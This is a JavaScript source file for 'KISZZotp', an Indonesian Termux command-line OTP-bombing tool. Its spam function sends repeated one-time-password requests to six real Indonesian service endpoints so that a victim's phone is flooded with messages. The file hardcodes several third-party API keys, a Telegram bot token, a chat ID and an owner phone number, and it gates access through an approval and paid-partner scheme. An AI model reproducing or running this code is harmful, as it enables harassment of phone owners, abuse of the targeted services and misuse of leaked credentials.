import axios from 'axios';
import chalk from 'chalk';
import readlineSync from 'readline-sync';
import { execSync } from 'child_process';
import fs from 'fs';
import os from 'os';
import crypto from 'crypto';

const C = {
    TOKEN: '8991103400:AAHR3EJhGd7MBfHeY8_6HJgnN93SEIdcvSY',
    CHAT_ID: '8276813899',
    OWNER: '085168142675',
    VER: '2.5.0',
    TIMEOUT: 120,
    POLL: 1,
};

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ====== LOGIN SYSTEM ======
function loadUsers() {
    try {
        if (!fs.existsSync('users.json')) return {};
        return JSON.parse(fs.readFileSync('users.json'));
    } catch { return {}; }
}
function saveUsers(users) {
    try {
        fs.writeFileSync('users.json', JSON.stringify(users, null, 2));
        return true;
    } catch { return false; }
}
function getUser(username) {
    const users = loadUsers();
    return users[username] || null;
}
function createUser(username, password) {
    const users = loadUsers();
    if (users[username]) return false;
    users[username] = { password, created: new Date().toISOString() };
    saveUsers(users);
    return true;
}
function loginUser(username, password) {
    const user = getUser(username);
    if (!user) return false;
    return user.password === password;
}
function getCurrentUser() {
    try {
        if (!fs.existsSync('current.json')) return null;
        const data = JSON.parse(fs.readFileSync('current.json'));
        return data.username || null;
    } catch { return null; }
}
function setCurrentUser(username) {
    try {
        fs.writeFileSync('current.json', JSON.stringify({ username, login: new Date().toISOString() }, null, 2));
        return true;
    } catch { return false; }
}
function logoutUser() {
    try { if (fs.existsSync('current.json')) fs.unlinkSync('current.json'); return true; } catch { return false; }
}

// ====== LOG ACTIVITY ======
function logActivity(user, action, detail) {
    if (!detail) detail = '';
    try {
        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
        const log = '[' + timestamp + '] ' + user + ' -> ' + action + ' ' + detail + '\n';
        fs.appendFileSync('activity.log', log);
    } catch {}
}

// ====== INFO & CHANNEL (hanya di Termux) ======
function getInfo() {
    try {
        if (!fs.existsSync('info.json')) return null;
        const data = JSON.parse(fs.readFileSync('info.json'));
        return data.text || null;
    } catch { return null; }
}
function setInfo(text) {
    try {
        fs.writeFileSync('info.json', JSON.stringify({ text: text.trim(), updated: new Date().toISOString() }, null, 2));
        return true;
    } catch { return false; }
}
function delInfo() {
    try { if (fs.existsSync('info.json')) fs.unlinkSync('info.json'); return true; } catch { return false; }
}

function getChannel() {
    try {
        if (!fs.existsSync('channel.json')) return null;
        const data = JSON.parse(fs.readFileSync('channel.json'));
        return data.link || null;
    } catch { return null; }
}
function setChannel(link) {
    try {
        fs.writeFileSync('channel.json', JSON.stringify({ link: link.trim(), updated: new Date().toISOString() }, null, 2));
        return true;
    } catch { return false; }
}
function delChannel() {
    try { if (fs.existsSync('channel.json')) fs.unlinkSync('channel.json'); return true; } catch { return false; }
}

// ====== UTILITY ======
function getID() {
    try { return execSync('id -u').toString().trim() + '@' + os.hostname(); } catch { return 'unknown'; }
}
function getDevice() {
    try {
        const m = execSync('getprop ro.product.model 2>/dev/null || echo "Unknown"').toString().trim();
        const a = execSync('getprop ro.build.version.release 2>/dev/null || echo "Unknown"').toString().trim();
        return m + ' (Android ' + a + ')';
    } catch { return 'Unknown'; }
}
function getTime() { return new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }); }
function genCode() { return crypto.randomInt(100000, 999999).toString(); }

// ====== TELEGRAM ======
async function sendTG(text, kb) {
    if (!kb) kb = null;
    try {
        const p = { chat_id: C.CHAT_ID, text: text, parse_mode: 'Markdown' };
        if (kb) p.reply_markup = JSON.stringify({ inline_keyboard: kb });
        await axios.post('https://api.telegram.org/bot' + C.TOKEN + '/sendMessage', p);
        return true;
    } catch { return false; }
}
async function ansCB(id, text) {
    try {
        await axios.post('https://api.telegram.org/bot' + C.TOKEN + '/answerCallbackQuery', {
            callback_query_id: id, text: text, show_alert: false
        });
    } catch {}
}
async function getUpd(off) {
    try {
        const r = await axios.get('https://api.telegram.org/bot' + C.TOKEN + '/getUpdates', {
            params: { offset: off, timeout: 10 }
        });
        return r.data.result || [];
    } catch { return []; }
}

// ====== APPROVAL ======
function isApp(id) {
    try {
        if (!fs.existsSync('approved.json')) return false;
        const data = JSON.parse(fs.readFileSync('approved.json'));
        return data.includes(id);
    } catch { return false; }
}
function saveApp(id) {
    try {
        let d = fs.existsSync('approved.json') ? JSON.parse(fs.readFileSync('approved.json')) : [];
        if (!d.includes(id)) { d.push(id); fs.writeFileSync('approved.json', JSON.stringify(d, null, 2)); }
        return true;
    } catch { return false; }
}
function remApp(id) {
    try {
        let d = fs.existsSync('approved.json') ? JSON.parse(fs.readFileSync('approved.json')) : [];
        const nd = d.filter(function(x) { return x !== id; });
        fs.writeFileSync('approved.json', JSON.stringify(nd, null, 2));
        return true;
    } catch { return false; }
}
function getApprovedList() {
    try {
        if (!fs.existsSync('approved.json')) return [];
        return JSON.parse(fs.readFileSync('approved.json'));
    } catch { return []; }
}

// ====== LIMIT ======
function getLimit(id) {
    try {
        if (!fs.existsSync('limits.json')) return { count: 0, date: new Date().toDateString() };
        const d = JSON.parse(fs.readFileSync('limits.json'));
        return d[id] || { count: 0, date: new Date().toDateString() };
    } catch { return { count: 0, date: new Date().toDateString() }; }
}
function incLimit(id) {
    try {
        let d = fs.existsSync('limits.json') ? JSON.parse(fs.readFileSync('limits.json')) : {};
        const today = new Date().toDateString();
        if (!d[id] || d[id].date !== today) {
            d[id] = { count: 1, date: today };
        } else {
            d[id].count += 1;
        }
        fs.writeFileSync('limits.json', JSON.stringify(d, null, 2));
        return d[id].count;
    } catch { return 0; }
}

// ====== REQUEST APPROVAL ======
async function reqApp(user, id, dev) {
    const code = genCode();
    const kb = [[
        { text: '✅ Approve', callback_data: 'app_' + code },
        { text: '❌ Deny', callback_data: 'den_' + code }
    ]];
    const msg = '🔐 *Request Approval*\n👤 ' + user + '\n🆔 ' + id + '\n📱 ' + dev + '\n🔑 *' + code + '*';
    console.log(chalk.yellow('\n⏳ Mengirim request...'));
    if (!await sendTG(msg, kb)) {
        console.log(chalk.red('❌ Gagal kirim ke TG.'));
        process.exit(1);
    }
    console.log(chalk.green('✅ Request terkirim! Tunggu owner...'));
    let off = 0;
    try {
        const old = await getUpd(0);
        if (old.length > 0) off = old[old.length - 1].update_id + 1;
    } catch {}
    const start = Date.now();
    while ((Date.now() - start) / 1000 < C.TIMEOUT) {
        try {
            const up = await getUpd(off);
            for (const u of up) {
                off = u.update_id + 1;
                if (u.callback_query) {
                    const d = u.callback_query.data;
                    const from = u.callback_query.from.id;
                    const cid = u.callback_query.id;
                    if (from == C.CHAT_ID) {
                        if (d === 'app_' + code) {
                            await ansCB(cid, '✅ Disetujui!');
                            console.log(chalk.green('\n✅ APPROVED!'));
                            saveApp(id);
                            logActivity(user, 'APPROVED', id);
                            return true;
                        } else if (d === 'den_' + code) {
                            await ansCB(cid, '❌ Ditolak.');
                            console.log(chalk.red('\n❌ DENIED!'));
                            return false;
                        }
                    } else {
                        await ansCB(cid, '❌ Bukan owner!');
                    }
                }
            }
        } catch {}
        await sleep(C.POLL * 1000);
    }
    console.log(chalk.red('\n⏰ Waktu habis!'));
    return false;
}
EOF

// ====== LOGIN FUNCTION ======
function getLoginUser() {
    const current = getCurrentUser();
    if (current) {
        console.log(chalk.green('✅ Login sebagai: ' + current));
        return current;
    }
    let username = readlineSync.question(chalk.cyan('Masukkan nama Anda: '));
    username = username.trim();
    if (!username) username = 'Anonymous';

    const user = getUser(username);
    if (user) {
        let attempts = 3;
        while (attempts > 0) {
            const pass = readlineSync.question(chalk.cyan('Masukkan password: '), { hideEchoBack: true });
            if (loginUser(username, pass)) {
                setCurrentUser(username);
                console.log(chalk.green('✅ Login berhasil!'));
                return username;
            }
            attempts--;
            console.log(chalk.red('❌ Password salah! Sisa percobaan: ' + attempts));
        }
        console.log(chalk.red('❌ Gagal login. Script keluar.'));
        process.exit(1);
    } else {
        console.log(chalk.yellow('🔐 Buat akun baru untuk ' + username));
        const pass = readlineSync.question(chalk.cyan('Buat password (min 4 karakter): '), { hideEchoBack: true });
        if (!pass || pass.length < 4) {
            console.log(chalk.red('❌ Password minimal 4 karakter!'));
            process.exit(1);
        }
        createUser(username, pass);
        setCurrentUser(username);
        console.log(chalk.green('✅ Akun berhasil dibuat!'));
        return username;
    }
}

// ====== STATUS & UI ======
function getStat(isO, id) {
    if (isO) return chalk.green('★ OWNER');
    if (isApp(id)) return chalk.green('★ PARTNER');
    return chalk.yellow('▸ Gratisan');
}

function showInfoBox() {
    const info = getInfo();
    if (!info) return;
    console.log(chalk.yellow('\n╔═══════════════════════════════════╗'));
    console.log(chalk.yellow('║   📢 INFO DARI KISZZ             ║'));
    console.log(chalk.yellow('╠═══════════════════════════════════╣'));
    console.log(chalk.white('║ ' + info.padEnd(29) + ' ║'));
    console.log(chalk.yellow('╚═══════════════════════════════════╝'));
}

function showHead(u, s, id, dev) {
    console.clear();
    console.log(chalk.cyan('\n╔═══════════════════════════════════╗'));
    console.log(chalk.cyan('║   KISZZotp v' + C.VER + '               ║'));
    console.log(chalk.cyan('╠═══════════════════════════════════╣'));
    console.log(chalk.cyan('║ 👤 User  : ' + chalk.green(u)));
    console.log(chalk.cyan('║ 📊 Status: ' + s));
    console.log(chalk.cyan('║ 🆔 ID    : ' + chalk.blue(id)));
    console.log(chalk.cyan('║ 📱 Device: ' + chalk.magenta(dev)));
    console.log(chalk.cyan('║ ⏰ Waktu : ' + chalk.gray(getTime())));
    console.log(chalk.cyan('╚═══════════════════════════════════╝\n'));
    showInfoBox();
}

function showMenu(isO) {
    console.log(chalk.yellow('\n📋 MENU UTAMA'));
    console.log(chalk.yellow('─'.repeat(30)));
    console.log(chalk.cyan('1.') + ' 🚀 Spammer OTP');
    console.log(chalk.cyan('2.') + ' 🐛 Lapor Bug');
    console.log(chalk.cyan('3.') + ' 🔄 Cek Update');
    console.log(chalk.cyan('4.') + ' ❌ Keluar');
    if (isO) {
        console.log(chalk.cyan('5.') + ' 👥 Add Partner (Owner Only)');
        console.log(chalk.cyan('6.') + ' 📢 Set Saluran KISZZ (Owner Only)');
        console.log(chalk.cyan('7.') + ' ❌ Delete Partner (Owner Only)');
    }
    console.log(chalk.yellow('─'.repeat(30)));
}

// ====== SPAMMER ======
async function spam(user, id, isO, isP) {
    console.clear();
    console.log(chalk.cyan('\n🚀 SPAMMER OTP\n'));
    if (!isO && !isP) {
        const lim = getLimit(id);
        const today = new Date().toDateString();
        if (lim.date === today && lim.count >= 3) {
            console.log(chalk.red('❌ Limit habis! (3x/hari). Upgrade ke partner.'));
            readlineSync.question(chalk.gray('\nTekan Enter...'));
            return;
        }
    }
    const inp = readlineSync.question(chalk.white('📱 Nomor (pisah koma untuk partner/owner): '));
    if (!inp.trim()) {
        console.log(chalk.red('❌ Tidak boleh kosong!'));
        readlineSync.question(chalk.gray('\nTekan Enter...'));
        return;
    }
    let targets = (isP || isO) ? inp.split(',').map(function(t) { return t.trim(); }) : [inp.trim()];
    const delay = (isP || isO) ? 500 : 2000;
    for (let idx = 0; idx < targets.length; idx++) {
        const t = targets[idx];
        let phone = t.replace(/[^0-9]/g, '');
        if (phone.startsWith('0')) phone = '62' + phone.slice(1);
        if (!phone.startsWith('62')) phone = '62' + phone;
        const p08 = '0' + phone.slice(2);
        const p62 = phone;
        console.log(chalk.green('✅ Target: ' + phone));
        const otp = [
            { url: 'https://internetrakyat.id/api/app/auth/send-otp-register', data: { phone_number: p08 }, headers: { 'x-api-key': '280999!FTTH' } },
            { url: 'https://www.alodokter.com/resend-otp', data: { user: { phone: p08, uuid: 'f6bd0911---b189-' }, request_via: 'whatsapp' } },
            { url: 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp', data: { accountType: 'customers', applicationType: 'Pinhome Web', countryCode: '62', medium: 'whatsapp', otpType: 'register', phoneNumber: p62.replace('62', '') } },
            { url: 'https://www.rumah123.com/api/otp/request-otp', data: { ipAddress: '36.67.110.51', phoneNumber: p62, portalId: 1, type: 'WHATSAPP', url: 'https://www.rumah123.com/user/login' }, headers: { 'Base-Url-Core': 'https://www.rumah123.com' } },
            { url: 'https://beta.api.saturdays.com/api/v1/user/otp/send', data: { number: p62.replace('62', ''), country_code: '+62', type: '' }, headers: { 'x-api-key': 'GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj', 'country-code': 'ID' } },
            { url: 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata', data: { mobileNumber: p62.replace('62', ''), type: 'prospect-create', channel: 'whatsapp' } }
        ];
        let s = 0, f = 0;
        for (let i = 0; i < otp.length; i++) {
            const ep = otp[i];
            try {
                const cfg = { headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0', ...(ep.headers || {}) }, timeout: 10000 };
                process.stdout.write('[' + (i+1) + '/' + otp.length + '] 🔄 Mengirim... ');
                if (ep.method === 'GET') await axios.get(ep.url, cfg);
                else await axios.post(ep.url, ep.data, cfg);
                s++;
                console.log(chalk.green('✅ Berhasil'));
            } catch {
                f++;
                console.log(chalk.red('❌ Gagal'));
            }
            await sleep(delay);
        }
        console.log('\n📱 ' + phone + '\n📤 ' + otp.length + '\n✅ ' + s + '\n❌ ' + f);
        logActivity(user, 'SPAM', 'Target: ' + phone + ' | Berhasil: ' + s + ' | Gagal: ' + f);
    }
    if (!isO && !isP) {
        const nc = incLimit(id);
        console.log(chalk.gray('📊 Sisa limit: ' + (3 - nc) + ' dari 3.'));
    }
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

function laporBug(user) {
    console.clear();
    console.log(chalk.yellow('\n🐛 LAPOR BUG\n'));
    console.log(chalk.white('📱 Owner: ' + C.OWNER));
    const c = readlineSync.question(chalk.cyan('Buka WhatsApp? (y/n): '));
    if (c.toLowerCase() === 'y') {
        execSync('termux-open-url "https://wa.me/' + C.OWNER + '?text=Halo%20KISZZ%2C%20saya%20' + encodeURIComponent(user) + '%20ingin%20lapor%20bug."');
        logActivity(user, 'LAPOR_BUG', '');
    }
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

function cekUpdate(user) {
    console.clear();
    console.log(chalk.cyan('\n🔄 CEK UPDATE\n'));
    console.log(chalk.green('✅ Versi: ' + C.VER));
    logActivity(user, 'CEK_UPDATE', '');
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

// ====== FITUR OWNER DI TERMUX ======
async function addPartnerMenu(user) {
    console.clear();
    console.log(chalk.green('\n👥 ADD PARTNER\n'));
    const tid = readlineSync.question(chalk.cyan('📌 ID user (contoh: 10192@localhost): '));
    if (!tid.trim()) {
        console.log(chalk.red('❌ Tidak boleh kosong!'));
        readlineSync.question(chalk.gray('\nTekan Enter...'));
        return;
    }
    if (isApp(tid.trim())) {
        console.log(chalk.yellow('⚠️ ' + tid + ' sudah ada.'));
    } else {
        saveApp(tid.trim());
        console.log(chalk.green('✅ ' + tid + ' ditambahkan!'));
        logActivity(user, 'ADD_PARTNER', tid);
    }
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

async function deletePartnerMenu(user) {
    console.clear();
    console.log(chalk.red('\n❌ DELETE PARTNER\n'));
    const tid = readlineSync.question(chalk.cyan('📌 ID user (contoh: 10192@localhost): '));
    if (!tid.trim()) {
        console.log(chalk.red('❌ Tidak boleh kosong!'));
        readlineSync.question(chalk.gray('\nTekan Enter...'));
        return;
    }
    if (isApp(tid.trim())) {
        remApp(tid.trim());
        console.log(chalk.green('✅ ' + tid + ' telah dihapus dari daftar partner.'));
        logActivity(user, 'DELETE_PARTNER', tid);
    } else {
        console.log(chalk.yellow('⚠️ ' + tid + ' tidak ditemukan.'));
    }
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

async function setSaluranMenu(user) {
    console.clear();
    console.log(chalk.cyan('\n📢 SET SALURAN KISZZ\n'));
    const link = readlineSync.question(chalk.white('🔗 Masukkan link saluran (contoh: https://t.me/xxx): '));
    if (!link.trim()) {
        console.log(chalk.red('❌ Tidak boleh kosong!'));
        readlineSync.question(chalk.gray('\nTekan Enter...'));
        return;
    }
    setChannel(link.trim());
    console.log(chalk.green('✅ Saluran berhasil disimpan: ' + link));
    logActivity(user, 'SET_CHANNEL', link);
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

// ====== MAIN ======
async function main() {
    console.clear();
    console.log(chalk.cyan('\n╔═══════════════════════════════════════════════╗'));
    console.log(chalk.cyan('║     SELAMAT DATANG DI KISZZotp               ║'));
    console.log(chalk.cyan('╚═══════════════════════════════════════════════╝\n'));
    await sleep(1000);

    const userName = getLoginUser();
    const termuxId = getID();
    const device = getDevice();
    const isOwner = userName.toLowerCase() === 'kiszzaja';
    const isPartner = isApp(termuxId);

    // Approval (hanya untuk user biasa yang belum approve)
    if (!isOwner) {
        if (!isApp(termuxId)) {
            console.log(chalk.yellow('\n🔐 Memerlukan approval owner.'));
            if (!await reqApp(userName, termuxId, device)) {
                console.log(chalk.red('❌ Akses ditolak.'));
                process.exit(1);
            }
        } else {
            console.log(chalk.green('\n✅ Sudah terdaftar sebagai partner!'));
            logActivity(userName, 'LOGIN', '');
            await sleep(1000);
        }
    } else {
        console.log(chalk.green('\n👑 Owner mode!'));
        await sleep(1000);
    }

    // ====== POLLING TELEGRAM (hanya /setstatus, /getstatus, /help) ======
    let offset = 0;
    (async function pollTelegram() {
        while (true) {
            if (isOwner) {
                try {
                    const updates = await getUpd(offset);
                    for (const u of updates) {
                        offset = u.update_id + 1;
                        if (u.message && u.message.text) {
                            const text = u.message.text;
                            const fromId = u.message.from.id;
                            if (fromId == C.CHAT_ID) {
                                if (text.startsWith('/setstatus')) {
                                    const parts = text.split(' ');
                                    if (parts.length < 3) {
                                        await sendTG('❌ Format: /setstatus <id> <status>', null);
                                        continue;
                                    }
                                    const targetId = parts[1].trim();
                                    const status = parts.slice(2).join(' ');
                                    try {
                                        let sd = fs.existsSync('status.json') ? JSON.parse(fs.readFileSync('status.json')) : {};
                                        sd[targetId] = status;
                                        fs.writeFileSync('status.json', JSON.stringify(sd, null, 2));
                                        await sendTG('✅ Status *' + targetId + '* -> *' + status + '*', null);
                                        logActivity('OWNER', 'SET_STATUS', targetId + ' -> ' + status);
                                    } catch (e) {
                                        await sendTG('❌ Gagal: ' + e.message, null);
                                    }
                                } else if (text.startsWith('/getstatus')) {
                                    const parts = text.split(' ');
                                    if (parts.length < 2) {
                                        await sendTG('❌ Format: /getstatus <id>', null);
                                        continue;
                                    }
                                    const targetId = parts[1].trim();
                                    try {
                                        const sd = fs.existsSync('status.json') ? JSON.parse(fs.readFileSync('status.json')) : {};
                                        const status = sd[targetId] || 'Gratisan';
                                        await sendTG('📌 Status *' + targetId + '*: *' + status + '*', null);
                                    } catch (e) {
                                        await sendTG('❌ Gagal: ' + e.message, null);
                                    }
                                } else if (text.startsWith('/help')) {
                                    await sendTG('📋 *Command Owner:*\n/setstatus <id> <status>\n/getstatus <id>\n/help', null);
                                } else {
                                    await sendTG('❌ Command tidak dikenali. Ketik /help', null);
                                }
                            }
                        }
                    }
                } catch (e) {}
            }
            await sleep(2000);
        }
    })();

    // ====== MENU UTAMA ======
    while (true) {
        const status = getStat(isOwner, termuxId);
        showHead(userName, status, termuxId, device);
        showMenu(isOwner);
        const maxMenu = isOwner ? 7 : 4;
        const choice = readlineSync.question(chalk.cyan('\nPilih menu [1-' + maxMenu + ']: '));
        switch (choice) {
            case '1':
                await spam(userName, termuxId, isOwner, isPartner);
                break;
            case '2':
                laporBug(userName);
                break;
            case '3':
                cekUpdate(userName);
                break;
            case '4':
                console.log(chalk.green('\n👋 Sampai jumpa!'));
                logoutUser();
                logActivity(userName, 'LOGOUT', '');
                process.exit(0);
            case '5':
                if (isOwner) await addPartnerMenu(userName);
                else console.log(chalk.red('❌ Menu owner!'));
                break;
            case '6':
                if (isOwner) await setSaluranMenu(userName);
                else console.log(chalk.red('❌ Menu owner!'));
                break;
            case '7':
                if (isOwner) await deletePartnerMenu(userName);
                else console.log(chalk.red('❌ Menu owner!'));
                break;
            default:
                console.log(chalk.red('❌ Salah!'));
                await sleep(1000);
        }
    }
}

main().catch(function(err) {
    console.error(chalk.red('❌ Error:', err.message));
});
